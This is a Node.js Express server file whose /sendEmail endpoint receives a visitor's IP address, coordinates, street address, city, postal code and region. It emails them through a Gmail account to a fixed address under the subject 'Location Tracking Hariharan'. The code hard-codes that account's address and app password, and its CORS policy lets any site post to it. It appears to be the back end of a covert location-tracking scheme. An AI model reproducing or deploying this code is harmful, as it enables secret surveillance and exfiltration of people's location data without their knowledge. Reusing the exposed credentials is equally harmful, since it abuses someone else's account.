const express = require('express');
const app = express();
const cors = require('cors')
const port = 3005;
const nodemailer = require('nodemailer');
app.use(express.json());
app.use(express.urlencoded());
app.use(cors());



// Use your Gmail email address and App Password


app.post('/sendEmail', (req, res) => {
    const { lat,lon,geo,address,ip,country,city,postal,region} = req.body;


  console.log("msg sms",geo,address)
    const user = 'hackerstyles2011@gmail.com';
const pass = 'jrmz jcdu blea alwl'; 

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user,
        pass,
    },
});

const mailOptions = {
    from: 'hackerstyles2011@gmail.com',
    to: 'hariharanb201120@gmail.com',
    subject: 'Location Tracking Hariharan',
    text: "Client ip address: "+ip+"\n"+"client latitude :"+lat +"\n"+"client longitude: "+lon+"\n"+"Client location :"+ geo +"\n" + "client Address :"+address +"\n"+"country :"+country+ "\n"+"city :"+city+"\n"+"postal :"+postal+"\n"+"region :"+region,
};

transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
        console.error('Error sending email:', error);
        res.status(500).send('Internal Server Error');
    } else {
        console.log('Email sent:', info.response);
        res.status(200).send('Email Sent Successfully');
    }
});

});

app.listen(port,()=>{
    console.log(`server is successfulling running in the ${port}`)
});